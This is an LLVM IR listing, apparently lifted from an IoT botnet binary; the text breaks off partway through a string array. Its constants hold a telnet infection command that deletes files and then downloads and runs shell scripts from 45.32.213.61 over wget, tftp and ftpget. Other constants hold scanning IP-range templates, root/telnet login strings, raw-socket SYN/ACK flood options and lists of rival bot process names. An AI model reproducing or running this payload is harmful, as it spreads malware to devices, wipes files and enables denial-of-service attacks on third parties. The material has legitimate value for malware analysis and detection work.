source_filename = "test"
target datalayout = "E-p:32:32:32-f80:32:32"

%0 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%1 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%2 = type { i1, i1, i1, i1 }

@r1 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@r9 = internal unnamed_addr global i32 0
@r10 = internal unnamed_addr global i32 0
@r11 = internal unnamed_addr global i32 0
@r19 = internal unnamed_addr global i32 0
@r20 = internal unnamed_addr global i32 0
@r21 = internal unnamed_addr global i32 0
@r22 = internal unnamed_addr global i32 0
@r23 = internal unnamed_addr global i32 0
@r24 = internal unnamed_addr global i32 0
@r25 = internal unnamed_addr global i32 0
@r26 = internal unnamed_addr global i32 0
@r27 = internal unnamed_addr global i32 0
@r28 = internal unnamed_addr global i32 0
@r29 = internal unnamed_addr global i32 0
@r30 = internal unnamed_addr global i32 0
@r31 = internal unnamed_addr global i32 0
@cr0_so = internal unnamed_addr global i1 false
@cr4 = internal unnamed_addr global i4 0
@lr = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_10030000.1 = global i32 0
@global_var_1002e00c.3 = global i32 0
@global_var_1002e01c.4 = local_unnamed_addr global i32* @global_var_1002e00c.3
@global_var_1002e670.7 = global i32 0
@global_var_1002e010.8 = global i32 0
@global_var_10010000.9 = constant i32 1207959588
@global_var_1002e688.10 = global i32 0
@global_var_1002e68c.11 = local_unnamed_addr global i32 0
@global_var_1002e690.12 = local_unnamed_addr global i32 0
@global_var_1002e274.13 = local_unnamed_addr global i32 4095
@global_var_1002e270.14 = local_unnamed_addr global i32 362436
@global_var_1001388c.15 = constant [7 x i8] c"(null)\00"
@global_var_1002e608.16 = local_unnamed_addr global i32 0
@global_var_100013c0.17 = constant i32 1207998161
@global_var_1000140c.18 = constant i32 939589631
@global_var_10001460.19 = constant i32 1207959608
@global_var_10013894.20 = constant [8 x i8] c"/bin/sh\00"
@global_var_10013490.21 = constant [3 x i8] c"sh\00"
@global_var_1001389c.22 = constant [3 x i8] c"-c\00"
@global_var_100014c0.23 = constant [3 x i8] c"8`\00"
@global_var_100014f0.24 = constant i32 1207959576
@global_var_100138a0.25 = constant i32 -1
@global_var_10013ca0.26 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_10013cb0.27 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_10001ce8.28 = constant i32 939524096
@global_var_10001d34.29 = constant i32 939524097
@global_var_10001f28.30 = constant i32 939524126
@global_var_1002e5e8.31 = local_unnamed_addr global i32 0
@global_var_10013cbc.32 = constant [5 x i8] c"PING\00"
@global_var_10002024.33 = constant i32 939524126
@global_var_1001387c.34 = constant [8 x i8] c"busybox\00"
@global_var_10013884.35 = constant i32 603979776
@global_var_10013888.36 = constant i32 587202560
@global_var_1002e1f4.37 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1001387c.34, i32 0, i32 0), i8* bitcast (i32* @global_var_10013884.35 to i8*), i8* bitcast (i32* @global_var_10013888.36 to i8*)]
@global_var_10013844.38 = constant [7 x i8] c"nvalid\00"
@global_var_1001384c.39 = constant [6 x i8] c"ailed\00"
@global_var_10013854.40 = constant [9 x i8] c"ncorrect\00"
@global_var_10013860.41 = constant [6 x i8] c"enied\00"
@global_var_10013868.42 = constant [5 x i8] c"rror\00"
@global_var_10013870.43 = constant [7 x i8] c"oodbye\00"
@global_var_10013878.44 = constant [4 x i8] c"bad\00"
@global_var_1002e1d4.45 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10013844.38, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1001384c.39, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10013854.40, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10013860.41, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10013868.42, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10013870.43, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10013878.44, i32 0, i32 0)]
@global_var_100027a0.46 = constant i32 939524098
@global_var_100029a8.47 = constant i32 939524097
@global_var_1002e5f0.48 = global i32 0
@global_var_1002e5f4.49 = local_unnamed_addr global i32 0
@global_var_1002e61c.50 = local_unnamed_addr global i32 0
@global_var_10002d20.51 = constant i32 939524096
@global_var_10013cc4.52 = constant [6 x i8] c":>%$#\00"
@global_var_10013ccc.58 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_10013cdc.59 = constant [13 x i8] c"43.239.%d.%d\00"
@global_var_10013cec.60 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_10013cf8.61 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_10013d08.62 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_10013d14.63 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_10013d24.64 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_10013d30.65 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_10013d40.66 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_10013d50.67 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_10013d60.68 = constant [13 x i8] c"77.209.%d.%d\00"
@global_var_10013d70.69 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_10013d7c.70 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_10013d8c.71 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_10013d9c.72 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_10013dac.73 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_10013dbc.74 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_10013dcc.75 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_10013ddc.76 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_10013de8.77 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_10013df4.78 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_10013e04.79 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_10013e10.80 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_10013e1c.81 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_10013e28.82 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_10013e34.83 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_10013e40.84 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_10013e50.85 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_10013e60.86 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_10013e6c.87 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_10013e7c.88 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_10013e88.89 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_10013e94.90 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_10013ea0.91 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_10013eac.92 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_10013eb8.93 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_10013ec4.94 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_10013ed0.95 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_10013ee0.96 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_10013ef0.97 = constant [11 x i8] c"60.0.%d.%d\00"
@global_var_10013efc.98 = constant [12 x i8] c"60.16.%d.%d\00"
@global_var_10013f08.99 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_10013f18.100 = constant [12 x i8] c"62.30.%d.%d\00"
@global_var_10013f24.101 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_10013f34.102 = constant [13 x i8] c"62.254.%d.%d\00"
@global_var_10013f44.103 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_10013f54.104 = constant [12 x i8] c"77.96.%d.%d\00"
@global_var_10013f60.105 = constant [12 x i8] c"77.97.%d.%d\00"
@global_var_10013f6c.106 = constant [12 x i8] c"77.98.%d.%d\00"
@global_var_10013f78.107 = constant [13 x i8] c"77.100.%d.%d\00"
@global_var_10013f88.108 = constant [13 x i8] c"77.102.%d.%d\00"
@global_var_10013f98.109 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_10013fa8.110 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_10013fb8.111 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_10013fc8.112 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_10013fd8.113 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_10013fe8.114 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_10013ff8.115 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_10014008.116 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_10014018.117 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_10014028.118 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_10014038.119 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_10014048.120 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_10014058.121 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_10014068.122 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_10014078.123 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_10014088.124 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_10014098.125 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_100140a8.126 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_100140b8.127 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_100140c8.128 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_100140d8.129 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_100140e8.130 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_100140f8.131 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_10014108.132 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_10014118.133 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_10014128.134 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_10014138.135 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_10014148.136 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_10014158.137 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_10014168.138 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_10014178.139 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_10014188.140 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_10014198.141 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_100141a8.142 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_100141b8.143 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_100141c8.144 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_100141d8.145 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_100141e8.146 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_100141f8.147 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_10014208.148 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_10014218.149 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_10014228.150 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_10014238.151 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_10014248.152 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_10014258.153 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_10014268.154 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_10014278.155 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_10014288.156 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_10014298.157 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_100142a4.158 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_100142b4.159 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_100142c4.160 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_100142d4.161 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_100142e0.162 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_100142f0.163 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_10014300.164 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_10014310.165 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_10014320.166 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_10014330.167 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_10014340.168 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_10014350.169 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_1002e230.170 = global i32 110
@global_var_10014360.171 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_1002e610.172 = local_unnamed_addr global i32 0
@global_var_10005f84.173 = constant i32 939524096
@global_var_10006144.174 = constant i32 939524098
@global_var_10006200.175 = constant i32 939524096
@global_var_100137c8.176 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_100137d8.177 = constant [6 x i8] c"/tmp/\00"
@global_var_100137e0.178 = constant [6 x i8] c"/var/\00"
@global_var_100137e8.179 = constant [6 x i8] c"/dev/\00"
@global_var_100137f0.180 = constant [10 x i8] c"/var/run/\00"
@global_var_100137fc.181 = constant [10 x i8] c"/dev/shm/\00"
@global_var_10013808.182 = constant [6 x i8] c"/mnt/\00"
@global_var_10013810.183 = constant [7 x i8] c"/boot/\00"
@global_var_10013818.184 = constant [6 x i8] c"/usr/\00"
@global_var_10013820.185 = constant [6 x i8] c"/opt/\00"
@global_var_1002e194.186 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_100137c8.176, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100137d8.177, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100137e0.178, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100137e8.179, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100137f0.180, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100137fc.181, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10013808.182, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10013810.183, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10013818.184, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10013820.185, i32 0, i32 0)]
@global_var_10014398.187 = constant i32 -57368
@global_var_1000668c.188 = constant i32 1207962236
@global_var_100066ac.189 = constant i32 1207962204
@global_var_100137b4.201 = constant [5 x i8] c"root\00"
@global_var_100137bc.202 = constant [7 x i8] c"telnet\00"
@global_var_100137c4.203 = constant i32 0
@global_var_100135bc.225 = constant [504 x i8] c"cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.213.61/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 45.32.213.61 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 45.32.213.61; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 45.32.213.61 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\0D\0A\00"
@global_var_1001c368.226 = constant i32 33554944
@global_var_1001c668.227 = constant i32 1
@global_var_1002e348.230 = global i32 34603008
@global_var_100143b8.233 = constant [6 x i8] c"arfgG\00"
@global_var_100143c0.234 = constant [9 x i8] c"HBiug655\00"
@global_var_100143cc.235 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_100143dc.236 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_100143f0.237 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_10014404.238 = constant [12 x i8] c"GJjyur67458\00"
@global_var_10014410.239 = constant [12 x i8] c"RYSDk747586\00"
@global_var_1001441c.240 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_10014428.241 = constant [10 x i8] c"KHGK7985i\00"
@global_var_10014434.242 = constant [11 x i8] c"yuituiILYF\00"
@global_var_10014440.243 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_10014450.244 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_1001445c.245 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_1001446c.246 = constant [9 x i8] c"ewqdcftr\00"
@global_var_10014478.247 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_10014488.248 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_10014494.249 = constant [12 x i8] c"twehgbferhb\00"
@global_var_100144a0.250 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_100144ac.251 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_100144bc.252 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_100144cc.253 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_100144dc.254 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_100144e8.255 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_100144f8.256 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_10014508.257 = constant [12 x i8] c"yteytietyue\00"
@global_var_10014514.258 = constant [9 x i8] c"qsortEQS\00"
@global_var_10014520.259 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_10014530.260 = constant [4 x i8] c"std\00"
@global_var_10014534.261 = constant [4 x i8] c"dts\00"
@global_var_10014538.262 = constant [4 x i8] c"lsk\00"
@global_var_1001453c.263 = constant [4 x i8] c"kek\00"
@global_var_10014540.264 = constant [6 x i8] c"smack\00"
@global_var_10014548.265 = constant [4 x i8] c"ily\00"
@global_var_1001454c.266 = constant [4 x i8] c"tyf\00"
@global_var_10014550.267 = constant [4 x i8] c"pos\00"
@global_var_10014554.268 = constant [6 x i8] c"cunts\00"
@global_var_1001455c.269 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100143b8.233, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100143c0.234, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_100143cc.235, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_100143dc.236, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_100143f0.237, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10014404.238, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10014410.239, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1001441c.240, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10014428.241, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10014434.242, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10014440.243, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10014450.244, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1001445c.245, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1001446c.246, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_10014478.247, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10014488.248, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10014494.249, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_100144a0.250, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_100144ac.251, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_100144bc.252, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_100144cc.253, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_100144dc.254, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_100144e8.255, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_100144f8.256, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10014508.257, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10014514.258, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_10014520.259, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10014530.260, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10014534.261, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10014538.262, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001453c.263, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10014540.264, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10014548.265, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001454c.266, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10014550.267, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10014554.268, i32 0, i32 0)]
@global_var_10007218.270 = constant i32 1207990169
@global_var_10007298.271 = constant [3 x i8] c"8`\00"
@global_var_100072c0.272 = constant [3 x i8] c"8`\00"
@global_var_100072c8.273 = constant i32 939524096
@global_var_100145ec.274 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_100073e4.275 = constant i32 1207960928
@global_var_10007438.276 = constant [3 x i8] c"8`\00"
@global_var_10007504.277 = constant [3 x i8] c"9 \00"
@global_var_10007568.278 = constant i32 1207960524
@global_var_10014608.279 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_100075b8.280 = constant i32 1207960444
@global_var_100075ec.281 = constant i32 1207989189
@global_var_10007918.282 = constant [3 x i8] c"9 \00"
@global_var_10007a60.283 = constant i32 1207960876
@global_var_10007ab0.284 = constant i32 1207960796
@global_var_1001462c.285 = constant [4 x i8] c"all\00"
@global_var_10014630.286 = constant i32 738197504
@global_var_10014634.287 = constant [4 x i8] c"syn\00"
@global_var_10014638.288 = constant [4 x i8] c"rst\00"
@global_var_1001463c.289 = constant [4 x i8] c"fin\00"
@global_var_10014640.290 = constant [4 x i8] c"ack\00"
@global_var_10014644.291 = constant [4 x i8] c"psh\00"
@global_var_10014648.292 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_10007d80.293 = constant [3 x i8] c"8`\00"
@global_var_10013350.297 = constant [5 x i8] c"mips\00"
@global_var_10013358.298 = constant [7 x i8] c"mipsel\00"
@global_var_10013360.299 = constant [4 x i8] c"sh4\00"
@global_var_10013364.300 = constant [4 x i8] c"x86\00"
@global_var_10013368.301 = constant [5 x i8] c"i686\00"
@global_var_10013370.302 = constant [4 x i8] c"ppc\00"
@global_var_10013374.303 = constant [5 x i8] c"i586\00"
@global_var_1001337c.304 = constant [8 x i8] c"jackmy*\00"
@global_var_10013384.305 = constant [8 x i8] c"hackmy*\00"
@global_var_1001338c.306 = constant [5 x i8] c"arm*\00"
@global_var_10013394.307 = constant [3 x i8] c"b1\00"
@global_var_10013398.308 = constant [3 x i8] c"b2\00"
@global_var_1001339c.309 = constant [3 x i8] c"b3\00"
@global_var_100133a0.310 = constant [3 x i8] c"b4\00"
@global_var_100133a4.311 = constant [3 x i8] c"b5\00"
@global_var_100133a8.312 = constant [3 x i8] c"b6\00"
@global_var_100133ac.313 = constant [3 x i8] c"b7\00"
@global_var_100133b0.314 = constant [3 x i8] c"b8\00"
@global_var_100133b4.315 = constant [3 x i8] c"b9\00"
@global_var_100133b8.316 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_100133cc.317 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_100133d8.318 = constant [10 x i8] c"dvrHelper\00"
@global_var_100133e4.319 = constant [8 x i8] c"FDFDHFC\00"
@global_var_100133ec.320 = constant [5 x i8] c"FEUB\00"
@global_var_100133f4.321 = constant [9 x i8] c"FTUdftui\00"
@global_var_10013400.322 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_1001340c.323 = constant [6 x i8] c"jhUOH\00"
@global_var_10013414.324 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_10013420.325 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_1001342c.326 = constant [10 x i8] c"kmyx86_64\00"
@global_var_10013438.327 = constant [10 x i8] c"lolmipsel\00"
@global_var_10013444.328 = constant [8 x i8] c"RYrydry\00"
@global_var_1001344c.329 = constant [5 x i8] c"tel*\00"
@global_var_10013454.330 = constant [9 x i8] c"TwoFace*\00"
@global_var_10013460.331 = constant [9 x i8] c"UYyuyioy\00"
@global_var_1001346c.332 = constant [5 x i8] c"wget\00"
@global_var_10013474.333 = constant [7 x i8] c"x86_64\00"
@global_var_1001347c.334 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_10013488.335 = constant [5 x i8] c"xxb*\00"
@global_var_10013494.336 = constant i32 822083584
@global_var_10013498.337 = constant i32 838860800
@global_var_1001349c.338 = constant i32 855638016
@global_var_100134a0.339 = constant i32 872415232
@global_var_100134a4.340 = constant i32 889192448
@global_var_100134a8.341 = constant i32 905969664
@global_var_100134ac.342 = constant i32 922746880
@global_var_100134b0.343 = constant i32 939524096
@global_var_100134b4.344 = constant i32 956301312
@global_var_100134b8.345 = constant [3 x i8] c"10\00"
@global_var_100134bc.346 = constant [3 x i8] c"11\00"
@global_var_100134c0.347 = constant [3 x i8] c"12\00"
@global_var_100134c4.348 = constant [3 x i8] c"13\00"
@global_var_100134c8.349 = constant [3 x i8] c"14\00"
@global_var_100134cc.350 = constant [3 x i8] c"15\00"
@global_var_100134d0.351 = constant [3 x i8] c"16\00"
@global_var_100134d4.352 = constant [3 x i8] c"17\00"
@global_var_100134d8.353 = constant [3 x i8] c"18\00"
@global_var_100134dc.354 = constant [3 x i8] c"19\00"
@global_var_100134e0.355 = constant [3 x i8] c"20\00"
@global_var_100134e4.356 = constant [6 x i8] c"hackz\00"
@global_var_100134ec.357 = constant [5 x i8] c"bin*\00"
@global_var_100134f4.358 = constant [5 x i8] c"gtop\00"
@global_var_100134fc.359 = constant [5 x i8] c"ftp*\00"
@global_var_10013504.360 = constant [6 x i8] c"tftp*\00"
@global_var_1001350c.361 = constant [7 x i8] c"botnet\00"
@global_var_10013514.362 = constant [8 x i8] c"swatnet\00"
@global_var_1001351c.363 = constant [8 x i8] c"ballpit\00"
@global_var_10013524.364 = constant [8 x i8] c"fucknet\00"
@global_var_1001352c.365 = constant [9 x i8] c"cracknet\00"
@global_var_10013538.366 = constant [8 x i8] c"weednet\00"
@global_var_10013540.367 = constant [7 x i8] c"gaynet\00"
@global_var_10013548.368 = constant [9 x i8] c"queernet\00"
@global_var_10013554.369 = constant [8 x i8] c"ballnet\00"
@global_var_1001355c.370 = constant [5 x i8] c"unet\00"
@global_var_10013564.371 = constant [7 x i8] c"yougay\00"
@global_var_1001356c.372 = constant [7 x i8] c"sttftp\00"
@global_var_10013574.373 = constant [7 x i8] c"sstftp\00"
@global_var_1001357c.374 = constant [7 x i8] c"sbtftp\00"
@global_var_10013584.375 = constant [6 x i8] c"btftp\00"
@global_var_1001358c.376 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_10013598.377 = constant [6 x i8] c"bruv*\00"
@global_var_100135a0.378 = constant [5 x i8] c"IoT*\00"
@global_var_1002e024.379 = global [86 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10013350.297, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10013358.298, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10013360.299, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10013364.300, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10013368.301, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10013370.302, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10013374.303, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10013374.303, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1001337c.304, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10013384.305, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001338c.306, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10013394.307, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10013398.308, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 